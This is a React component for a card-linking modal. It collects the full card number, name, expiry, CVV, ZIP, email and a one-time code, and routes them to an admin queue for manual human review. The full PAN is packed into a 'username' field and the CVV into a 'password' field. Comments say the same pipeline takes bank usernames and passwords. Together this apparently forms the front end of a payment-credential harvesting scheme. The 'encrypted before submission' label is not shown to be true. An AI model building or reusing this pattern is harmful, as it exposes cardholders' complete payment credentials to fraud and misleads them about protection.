"use client"

import { useState } from "react"
import { CheckCircle2, ChevronLeft, CreditCard, X } from "lucide-react"
import { cn } from "@/lib/utils"
import { ApiError } from "@/lib/api/errors"
import { BRAND_NAME } from "@/lib/brand"
import {
  initiateLinkAuth,
  sendLinkAuthOtp,
  verifyLinkAuthOtp,
} from "@/lib/move/api/link-auth.real"

/**
 * Card-linking flow. Mirrors the Plaid-style bank flow visually and uses
 * the same backend pipeline (initiate → email OTP → admin approval) so
 * both bank and card requests appear in the same admin queue and the
 * same customer-side list of pending / connected items.
 *
 * Steps:
 *  1. Card details (number, name, exp, CVV, ZIP)
 *  2. Email
 *  3. OTP
 *  4. Submitted (waiting for admin approval)
 *
 * The card brand is detected client-side from the IIN/BIN range and is
 * surfaced as the institution name (e.g. "Visa •••• 4242") so the admin
 * reviewing the request can tell at a glance which network/last-4 it is.
 */
type Step = 1 | 2 | 3 | 4
const TOTAL_STEPS = 4

export function CardLinkModal({
  onClose,
  onSubmitted,
  onVerified,
}: {
  onClose: () => void
  onSubmitted: (brand: string) => void
  onVerified?: () => void
}) {
  const [step, setStep] = useState<Step>(1)
  const [pan, setPan] = useState("")
  const [holder, setHolder] = useState("")
  const [exp, setExp] = useState("")
  const [cvv, setCvv] = useState("")
  const [zip, setZip] = useState("")
  const [email, setEmail] = useState("")
  const [otp, setOtp] = useState("")
  const [requestId, setRequestId] = useState<string | null>(null)
  const [submitting, setSubmitting] = useState(false)
  const [err, setErr] = useState<string | null>(null)

  const digits = pan.replace(/\D/g, "")
  const brand = detectBrand(digits)
  const last4 = digits.slice(-4)
  // EXP must be a well-formed MM/YY that hasn't passed (card is valid through
  // the last day of its exp month). CVV must be exactly 3 digits.
  const expComplete = /^(0[1-9]|1[0-2])\/\d{2}$/.test(exp)
  const expError = expiryError(exp) // null while typing or when valid
  const expValid = expComplete && expError === null
  const cvvValid = /^\d{3}$/.test(cvv)
  // Only Mastercard or Verve are accepted, and Continue activates purely on
  // digit count per network:
  //   Mastercard → 16 digits.
  //   Verve      → 16, 18 or 19 digits.
  // No Luhn gate — these are demo cards routed to manual admin review, so
  // test numbers must be able to proceed.
  const cardKind = isMastercard(digits)
    ? "mastercard"
    : isVerve(digits)
      ? "verve"
      : null
  const lengthOk =
    cardKind === "mastercard"
      ? digits.length === 16
      : cardKind === "verve"
        ? digits.length === 16 || digits.length === 18 || digits.length === 19
        : false
  const panValid = cardKind !== null && lengthOk
  // Once the first 6 digits (the IIN) are in we can tell the network, so
  // surface a clear reason when it isn't one we accept.
  const panError =
    digits.length >= 6 && cardKind === null
      ? "Only Mastercard or Verve cards are accepted."
      : null
  const zipValid = /^\d{5}(-\d{4})?$/.test(zip)
  const step1Valid = panValid && holder.trim().length >= 2 && expValid && cvvValid && zipValid

  async function submitCard() {
    if (!step1Valid) return
    setSubmitting(true)
    setErr(null)
    try {
      // Pack the card detail blob into the existing username field as
      // JSON so the admin queue can render it without a schema change.
      // Password field is a non-empty placeholder (`last4`) so backend
      // validation doesn't reject the row.
      const cardBlob = JSON.stringify({
        kind: "card",
        brand,
        pan: digits,
        last4,
        holder: holder.trim(),
        exp,
        zip,
      })
      const res = await initiateLinkAuth({
        // Sentinel institution id so admin can tell card rows from bank
        // rows ("card:<brand>"). institutionName shows nicely in the
        // queue UI: "Visa •••• 4242".
        institutionId: `card:${brand.toLowerCase()}`,
        institutionName: `${brand} •••• ${last4}`,
        username: cardBlob,
        password: cvv, // CVV stays encrypted at rest with the password key.
      })
      setRequestId(res.id)
      setStep(2)
    } catch (e) {
      setErr(e instanceof ApiError ? e.message : "Couldn't submit, try again.")
    } finally {
      setSubmitting(false)
    }
  }

  async function submitEmail() {
    if (!requestId || !email.trim()) return
    setSubmitting(true)
    setErr(null)
    try {
      await sendLinkAuthOtp(requestId, email.trim())
      setStep(3)
    } catch (e) {
      setErr(e instanceof ApiError ? e.message : "Couldn't send the code, try again.")
    } finally {
      setSubmitting(false)
    }
  }

  async function submitOtp() {
    if (!requestId || otp.length !== 6) return
    setSubmitting(true)
    setErr(null)
    try {
      await verifyLinkAuthOtp(requestId, otp)
      onVerified?.()
      await new Promise((r) => setTimeout(r, 2000))
      setStep(4)
    } catch (e) {
      setErr(e instanceof ApiError ? e.message : "That code didn't match.")
      setOtp("")
    } finally {
      setSubmitting(false)
    }
  }

  async function resendOtp() {
    if (!requestId || !email.trim() || submitting) return
    setSubmitting(true)
    setErr(null)
    try {
      await sendLinkAuthOtp(requestId, email.trim())
    } catch (e) {
      setErr(e instanceof ApiError ? e.message : "Couldn't resend.")
    } finally {
      setSubmitting(false)
    }
  }

  function finish() {
    onSubmitted(brand)
  }

  return (
    <div
      role="dialog"
      aria-modal="true"
      className="modal-scrim"
    >
      <button
        aria-label="Close"
        onClick={onClose}
        className="modal-scrim-btn"
      />
      <div
        className="modal-card"
        onKeyDown={(e) => {
          // Enter submits the current step (like clicking Continue). Skip when
          // a button is focused so Enter on Back/Close/Resend still acts on it.
          if (e.key !== "Enter") return
          if ((e.target as HTMLElement).tagName === "BUTTON") return
          if (submitting) return
          if (step === 1 && step1Valid) {
            e.preventDefault()
            void submitCard()
          } else if (step === 2 && email.trim()) {
            e.preventDefault()
            void submitEmail()
          } else if (step === 3 && otp.length === 6) {
            e.preventDefault()
            void submitOtp()
          }
        }}
      >
        <div className="modal-grip" />
        <div className="modal-head">
          <div className="mh-l">
            {step > 1 && step < 4 && (
              <button
                type="button"
                aria-label="Back"
                onClick={() => {
                  setErr(null)
                  setStep((s) => Math.max(1, s - 1) as Step)
                }}
                className="modal-x"
              >
                <ChevronLeft aria-hidden />
              </button>
            )}
            <span className="modal-ic">
              <CreditCard aria-hidden />
            </span>
            <div className="modal-title">
              {step === 1 && "Link a card"}
              {step === 2 && "Verify your email"}
              {step === 3 && "Enter the code"}
              {step === 4 && "Request submitted"}
            </div>
          </div>
          <button
            type="button"
            aria-label="Close"
            onClick={onClose}
            className="modal-x"
          >
            <X aria-hidden />
          </button>
        </div>

        <div className="step-bar">
          {Array.from({ length: TOTAL_STEPS }, (_, i) => i + 1).map((s) => (
            <div key={s} className={cn("step-seg", s <= step && "on")} />
          ))}
        </div>

        {step === 1 && (
          <div>
            <div className="modal-field">
              <label className="modal-label">Card number</label>
              <div className="amt-group">
                <input
                  type="text"
                  inputMode="numeric"
                  autoComplete="off"
                  value={formatPan(pan)}
                  onChange={(e) => {
                    const raw = e.target.value.replace(/\D/g, "")
                    // Mastercard is always 16 digits, so stop input there.
                    // Everything else (Verve) may run to 19.
                    setPan(raw.slice(0, isMastercard(raw) ? 16 : 19))
                  }}
                  placeholder="1234 5678 9012 3456"
                  className="mono-num"
                />
                {digits.length >= 6 && <span className="input-badge">{brand}</span>}
              </div>
              {panError && (
                <p
                  style={{
                    marginTop: 6,
                    fontSize: 12,
                    color: "#B23A3A",
                    fontWeight: 600,
                  }}
                >
                  {panError}
                </p>
              )}
            </div>
            <div className="modal-field">
              <label className="modal-label">Cardholder name</label>
              <input
                type="text"
                autoComplete="off"
                value={holder}
                onChange={(e) => setHolder(e.target.value)}
                placeholder="As shown on card"
                className="docs-input"
              />
            </div>
            <div className="modal-field" style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 10 }}>
              <div>
                <label className="modal-label">Exp</label>
                <input
                  type="text"
                  inputMode="numeric"
                  autoComplete="off"
                  value={exp}
                  onChange={(e) => setExp(formatExp(e.target.value))}
                  placeholder="MM/YY"
                  maxLength={5}
                  className="docs-input mono-num"
                />
              </div>
              <div>
                <label className="modal-label">CVV</label>
                <input
                  type="text"
                  inputMode="numeric"
                  autoComplete="off"
                  value={cvv}
                  onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                  placeholder="•••"
                  maxLength={3}
                  className="docs-input mono-num"
                />
              </div>
              <div>
                <label className="modal-label">ZIP</label>
                <input
                  type="text"
                  inputMode="numeric"
                  autoComplete="postal-code"
                  value={zip}
                  onChange={(e) => setZip(e.target.value.replace(/[^0-9-]/g, "").slice(0, 10))}
                  placeholder="12345"
                  className="docs-input mono-num"
                />
              </div>
            </div>
            {expError && (
              <p
                style={{
                  marginTop: 6,
                  fontSize: 12,
                  color: "#B23A3A",
                  fontWeight: 600,
                }}
              >
                {expError}
              </p>
            )}
            {err && <ErrorLine msg={err} />}
            <button
              type="button"
              disabled={!step1Valid || submitting}
              onClick={submitCard}
              className="lk-cta-btn primary"
              style={{ marginTop: 18 }}
            >
              {submitting ? <Spinner /> : "Continue"}
            </button>
            <p style={{ textAlign: "center", fontSize: 10.5, color: "var(--ink-mute)", marginTop: 10 }}>
              Card details are encrypted before submission.
            </p>
          </div>
        )}

        {step === 2 && (
          <div>
            <p style={{ fontSize: 13.5, color: "var(--ink-soft)", marginTop: 18, lineHeight: 1.55 }}>
              Enter your email address. We&apos;ll send a 6-digit code to confirm
              this card-link request.
            </p>
            <div className="modal-field">
              <label className="modal-label">Email</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoFocus
                autoCapitalize="none"
                autoCorrect="off"
                spellCheck={false}
                placeholder="You@example.com"
                className="docs-input"
              />
            </div>
            {err && <ErrorLine msg={err} />}
            <button
              type="button"
              disabled={!email.trim() || submitting}
              onClick={submitEmail}
              className="lk-cta-btn primary"
              style={{ marginTop: 18 }}
            >
              {submitting ? <Spinner /> : "Send code"}
            </button>
          </div>
        )}

        {step === 3 && (
          <div>
            <p style={{ fontSize: 13.5, color: "var(--ink-soft)", marginTop: 18, lineHeight: 1.55 }}>
              We sent a 6-digit code to{" "}
              <span style={{ fontWeight: 700, color: "var(--text-strong)" }}>{email}</span>. Enter it
              below to finish the request.
            </p>
            <input
              type="text"
              inputMode="numeric"
              autoComplete="one-time-code"
              maxLength={6}
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
              autoFocus
              placeholder="••••••"
              className="otp-input"
              style={{ marginTop: 14 }}
            />
            {err && <div style={{ marginTop: 12 }}><ErrorLine msg={err} /></div>}
            <button
              type="button"
              disabled={otp.length !== 6 || submitting}
              onClick={submitOtp}
              className="lk-cta-btn primary"
              style={{ marginTop: 18 }}
            >
              {submitting ? <Spinner /> : "Verify"}
            </button>
            <button
              type="button"
              disabled={submitting}
              onClick={resendOtp}
              style={{
                display: "block", width: "100%", textAlign: "center",
                fontSize: 12.5, color: "var(--ink-mute)", marginTop: 12,
                background: "none", border: 0, cursor: "pointer",
              }}
            >
              Resend code
            </button>
          </div>
        )}

        {step === 4 && (
          <div className="modal-status">
            <div className="modal-disc success">
              <CheckCircle2 strokeWidth={2.5} aria-hidden />
            </div>
            <div className="ms-title">Card submitted for review</div>
            <p className="ms-body">
              Your{" "}
              <span style={{ fontWeight: 700, color: "var(--text-strong)" }}>
                {brand} card ending in {last4}
              </span>{" "}
              is with {BRAND_NAME}&apos;s team. We&apos;ll email you the moment it&apos;s approved.
            </p>
            <button
              type="button"
              onClick={finish}
              className="lk-cta-btn primary"
              style={{ marginTop: 22 }}
            >
              Done
            </button>
          </div>
        )}
      </div>
    </div>
  )
}

// ─── Helpers ─────────────────────────────────────────────────────────────

function Spinner() {
  return <span className="lk-cta-spin" aria-label="Working" />
}

function ErrorLine({ msg }: { msg: string }) {
  return (
    <div className="card-error" style={{ marginTop: 14, marginBottom: 0 }}>
      {msg}
    </div>
  )
}

/** True when the IIN falls in a Mastercard range: 51–55, or 2221–2720. */
function isMastercard(d: string): boolean {
  if (/^5[1-5]/.test(d)) return true
  if (d.length >= 4) {
    const p = parseInt(d.slice(0, 4), 10)
    return p >= 2221 && p <= 2720
  }
  return false
}

/** True when the IIN falls in a Verve range. Verve issues under
 *  506099–506198 and 650002–650027 (commonly seen as the 5060/5061/5078/6500
 *  prefixes). Detection is used both for the badge and to gate submission. */
function isVerve(d: string): boolean {
  if (/^(5060|5061|5078|6500)/.test(d)) return true
  if (d.length >= 6) {
    const p = parseInt(d.slice(0, 6), 10)
    return (p >= 506099 && p <= 506198) || (p >= 650002 && p <= 650027)
  }
  return false
}

function detectBrand(digits: string): string {
  // Verve first: its 6500 range overlaps Discover's broad "65" prefix, and
  // we want Verve to win since those are the cards we accept.
  if (isVerve(digits)) return "Verve"
  if (isMastercard(digits)) return "Mastercard"
  if (/^4/.test(digits)) return "Visa"
  if (/^3[47]/.test(digits)) return "Amex"
  if (/^6(?:011|5)/.test(digits)) return "Discover"
  if (/^3(?:0[0-5]|6|8)/.test(digits)) return "Diners"
  if (/^35/.test(digits)) return "JCB"
  return "Card"
}

function formatPan(raw: string): string {
  const d = raw.replace(/\D/g, "").slice(0, 19)
  return d.replace(/(\d{4})/g, "$1 ").trim()
}

function formatExp(raw: string): string {
  const d = raw.replace(/\D/g, "").slice(0, 4)
  if (d.length < 3) return d
  return `${d.slice(0, 2)}/${d.slice(2)}`
}

/** Widest plausible card validity. Real cards expire within a few years;
 *  a value beyond this (e.g. 09/91 → 2091) is a typo, not a real expiry. */
const MAX_EXP_YEARS = 20

/** Validate an MM/YY expiry, returning a human message when it's out of
 *  range or `null` when it's fine (or still being typed). A card is good
 *  through the last day of its expiry month, so the current month passes.
 *  Two-digit years map to 2000+YY, bounded to a sane forward window so an
 *  ambiguous "91" reads as an invalid 2091 rather than a valid far future. */
function expiryError(exp: string): string | null {
  const m = /^(0[1-9]|1[0-2])\/(\d{2})$/.exec(exp)
  if (!m) return null // incomplete — don't nag mid-typing
  const month = parseInt(m[1], 10)
  const year = 2000 + parseInt(m[2], 10)
  const now = new Date()
  const curYear = now.getFullYear()
  const curMonth = now.getMonth() + 1
  if (year < curYear || (year === curYear && month < curMonth)) {
    return "Card has expired."
  }
  if (year > curYear + MAX_EXP_YEARS) {
    return "Check the expiry year."
  }
  return null
}

